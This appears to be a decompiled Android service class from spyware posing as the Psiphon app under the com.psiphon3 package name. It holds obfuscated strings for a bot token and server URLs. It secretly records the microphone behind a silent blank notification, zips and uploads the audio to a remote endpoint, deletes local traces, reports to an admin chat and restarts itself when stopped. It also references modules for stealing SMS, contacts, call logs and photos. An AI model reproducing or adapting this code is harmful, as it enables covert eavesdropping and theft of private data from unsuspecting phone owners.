package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class startrecord extends  android.app.Service{
	public static class startrecord_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (startrecord) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, startrecord.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static startrecord mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return startrecord.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.startrecord");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.startrecord", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (startrecord) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (startrecord) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (startrecord) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (startrecord) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (startrecord) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static com.rootsoft.audiorecorder.AudioRecorder _vvvv1 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,55,-53,-5,72,65,-43,-87,35,47,-54,-108,87,35,-33,-5,57,48,-80,-52,35,94,-69,-108,87,70,-70,-17,45,48,-63,-67,82,94}, 96337)+main.vvv13 (new byte[] {87,54,-92,53,45,37,-33,2,35,95,-91,43,38,71,-92,53,45,37,-33,2,35,95,-91,43,38,71,-92,53,45,37,-33,2,35,95,-91,90,87,71,-92,53,72,64,-53,22,35,46,-44,43,87,54,-92,53,72,64,-82,115,55,58,-44,90,38,71,-92,80,45,49,-33,2,82,95,-44,43,50,34,-63,53,57,49,-82,2,82,95,-91,43,87,71,-92,80,45,64,-33,2,82,46,-91,43,87}, 699101)+main.vvv13 (new byte[] {87,71,23,-66,45,37,29,-119,35,46,22,-47,87,71,23,-66,72,64,120,-99,82,46,103,-47,87,71,23,-66,57,64,29,-8,55,58,22,-96,38,71,23,-66,72,49,29,-8,82,58,115,-47,87,71,23,-49,57,49,29,-119,35,58,115,-47,87,71,102,-66,72,49,29,-8,35,58,115,-96,38,54,102,-49}, 287748)+main.vvv13 (new byte[] {38,53,101,62,72,67,123,29,35,92,21,81,38,68,20,79,57,50,123,29,35,45,100,32,87,53,20,91,45,50,30,9,82,45,21,32,38,68,101,91,45,67,30,120,82,92,21,81,87,53,101,62,45,38,111,9,35,92,21,32,38,68,20,91,45,67,30,120,82,92,100,32,87,53,101,62,45,38,30,9,82,45,100,32,38,53,101,62,72,38,123,9,82,92,21,32,38,68,20,62,72,38,123,9,35,45,21,32,87,53,20,62,72,38,123,120,35,92,21,81,87,68,20,79,57,67,123,29,35,92,21,81,38,68,20,79,57,50,123,29,82,45,100,32,38,68,20,62,72,67,30,120,55,57,100,81,87,68,101,62}, 883336)+main.vvv13 (new byte[] {87,54,-1,80,45,37,-11,22,82,95,-113,63,38,54,-1,80,45,37,-11,103,35,95,-113,78,38,54,-114,80,45,37,-124,22,82,95,-2,63,87,71,-1,80,72,37,-31,103,35,46,-2,63,87,71,-114,80,72,64,-124,2,55,46,-2,63,87,54,-114,33,57,49,-11,2,82,58,-113,78,38,54,-1,80,57,64,-124,22,82,58,-22,78,38,71,-114,80,72,64,-11,22,35,58,-22,78,87,71,-1,33,72,49,-124,103,35,58,-22,78,38,54,-114,33,72,64,-11,103}, 639305)+main.vvv13 (new byte[] {87,71,-10,31,57,49,-24,77,82,46,-29,100,87,54,-10,31,72,64,-24,60,82,95,-110,21,87,71,-109,31,45,64,-24,77,82,95,-110,100,38,71,-109,122,72,37,-4,77,82,95,-29,100,87,71,-30,122,57,37}, 591271);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,95,-30,72,67,36,-43,35,92,47,-103,50,53,46,-30,72,67,85,-43,35,45,47,-103,50,53,46,-30,72,67,85,-43,35,45,47,-103,50,53,95,-30,57,50,36,-43,35,45,47,-103,50,53,46,-30,57,50,36,-43,82,92,47,-103,50,52,47,-121,57,67,85,-43,35,92,47,-4,87,53,58,-121}, 749304)+main.vvv13 (new byte[] {38,71,-66,-114,57,64,-59,-71,82,46,-38,-124,38,71,-66,-114,57,64,-59,-71,82,46,-38,-112,50,54,-49,-114,57,64,-59,-56,82,95,-50,-124,50,71,-49,-114,57,49,-59,-56,35,95,-50,-124,50,54,-49,-1,72,64,-76,-56,35,46,-50,-124,50,54,-66}, 677691)+main.vvv13 (new byte[] {87,71,73,-110,57,64,67,-91,55,58,57,-3,87,54,56,-29,57,64,67,-91,55,58,57,-3,87,71,73,-110,57,49,50,-91,55,58,57,-116,38,71,73,-110,72,64,67,-91,55,58,57,-116,87,54,73,-110,57,64,67,-91,55,58,57,-116,87,71,73,-110,72,64,67,-91,55,46,45,-3,38,71,73,-110,57,64,50,-44,35,58,45,-3,38,71}, 209162)+main.vvv13 (new byte[] {38,54,118,21,72,49,124,54,34,58,6,11,87,54,118,21,57,64,124,34,55,58,6,11,87,71,118,100,72,64,124,83,55,58,6,122,87,71,118,21,57,49,13,34,55}, 214965);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,107,90,-71,115,46,1,-72,121,120,72}, 262255);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,104,-114,38,41}, 184299);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,-125,-51,72,64,-8,-6,35,95,-13,-74,50,54,-14,-51,72,64,-119,-6,35,46,-13,-74,50,54,-14,-51,72,64,-119,-6,35,46,-13,-74,50,54,-125,-51,57,49,-8,-6}, 629183)+main.vvv13 (new byte[] {38,53,65,-64,45,51,74,-122,35,45,64,-54,87,53,65,-91,72,50,95,-122,82,45,64,-54,38,53,65,-44,72,50,95,-122,35,45,49,-69,87,68,65,-44,57,50,95,-122,35,92,49,-69,87,68,65,-91,72,50,95}, 967659)+main.vvv13 (new byte[] {50,54,42,-98,57,49,32,-87,82,95,43,-27,50,54,42,-98,72,64,81,-87,35,46,43,-27,50,54,91,-17,72,64,81,-40,82,95,43,-27,50,54,91,-98,57,64,81,-87,82,95,43,-27,50,54,91,-98,72,64,81,-40,82,95,43,-27,38,34,42,-17,72,64,81,-87,82,46,90,-15,50,34,42,-17,72,49,32,-40,82,95,43,-128,50,55,62,-17,72,49,81,-40,35,46,43,-128,38,34,62,-17,72,64,32,-87,35,46}, 167657)+main.vvv13 (new byte[] {38,53,48,-59,45,50,75,-26,35,45,64,-66,38,53,48,-59,45,50,75,-26,82,45,64,-66,87,68,48,-59,57,38,58,-26,82,45,49,-49,38}, 781006)+main.vvv13 (new byte[] {38,54,-118,-115,45,49,-15,-82,82,95,-117,-121,38,71,-118,-115,45,49,-15,-82,35,46,-117}, 537290)+main.vvv13 (new byte[] {38,54,72,20,45}, 393382);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim ad As AudioRecorder";
_vvvv1 = new com.rootsoft.audiorecorder.AudioRecorder();
 //BA.debugLineNum = 23;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 27;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 29;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 30;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 31;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 32;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 33;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 35;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",startrecord.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",startrecord.getObject());
 //BA.debugLineNum = 37;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 38;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 39;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 40;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 41;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 42;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 43;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 48;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 49;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 50;BA.debugLine="ad.Initialize";
_vvvv1.Initialize(processBA);
 //BA.debugLineNum = 58;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 118;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 119;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 120;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 60;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 63;BA.debugLine="End Sub";
return "";
}
public static String  _startrecording(String _topic,String _data) throws Exception{
 //BA.debugLineNum = 65;BA.debugLine="Sub startrecording (Topic As String, Data As Strin";
 //BA.debugLineNum = 66;BA.debugLine="Try";
try { //BA.debugLineNum = 68;BA.debugLine="If ad.isRecording=False Then";
if (_vvvv1.isRecording()==anywheresoftware.b4a.keywords.Common.False) { 
 //BA.debugLineNum = 69;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"StartRecording..."+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 72;BA.debugLine="ad.AudioSource = ad.AS_MIC";
_vvvv1.setAudioSource(_vvvv1.AS_MIC);
 //BA.debugLineNum = 73;BA.debugLine="ad.OutputFormat = ad.OF_THREE_GPP";
_vvvv1.setOutputFormat(_vvvv1.OF_THREE_GPP);
 //BA.debugLineNum = 74;BA.debugLine="ad.AudioEncoder = ad.AE_AMR_NB";
_vvvv1.setAudioEncoder(_vvvv1.AE_AMR_NB);
 //BA.debugLineNum = 75;BA.debugLine="ad.setOutputFile(File.DirDefaultExternal , \"mp.";
_vvvv1.setOutputFile(anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal(),"mp.amr");
 //BA.debugLineNum = 76;BA.debugLine="ad.prepare";
_vvvv1.prepare();
 //BA.debugLineNum = 77;BA.debugLine="ad.start()";
_vvvv1.start();
 }else {
 //BA.debugLineNum = 79;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"fromPastRecording..."+"&reply_to_message_id="+BA.NumberToString(0));
 };
 } 
       catch (Exception e14) {
			processBA.setLastException(e14); //BA.debugLineNum = 87;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 89;BA.debugLine="End Sub";
return "";
}
public static String  _stoprecording(String _topic,String _data) throws Exception{
 //BA.debugLineNum = 92;BA.debugLine="Sub stoprecording (Topic As String, Data As String";
 //BA.debugLineNum = 94;BA.debugLine="Try";
try { //BA.debugLineNum = 95;BA.debugLine="If ad.isRecording=True Then";
if (_vvvv1.isRecording()==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 96;BA.debugLine="ad.stop";
_vvvv1.stop();
 //BA.debugLineNum = 97;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"stopReording..."+"&reply_to_message_id="+BA.NumberToString(0));
 //BA.debugLineNum = 99;BA.debugLine="zip.ABZipfile(File.DirDefaultExternal&\"/\" ,\"mp.";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal()+"/","mp.amr",anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal()+"/mp.zip");
 //BA.debugLineNum = 102;BA.debugLine="upload.upload(admin_id , \"Audio\".Replace(\" \",\"%";
_vv6._upload(_admin_id,"Audio".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal(),"mp.zip");
 //BA.debugLineNum = 104;BA.debugLine="File.Delete(File.DirDefaultExternal&\"/\" ,\"mp.am";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal()+"/","mp.amr");
 //BA.debugLineNum = 105;BA.debugLine="File.Delete(File.DirDefaultExternal&\"/\",\"mp.zip";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal()+"/","mp.zip");
 }else {
 //BA.debugLineNum = 108;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"nothingRecording..."+"&reply_to_message_id="+BA.NumberToString(0));
 };
 } 
       catch (Exception e13) {
			processBA.setLastException(e13); //BA.debugLineNum = 112;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 114;BA.debugLine="End Sub";
return "";
}
}
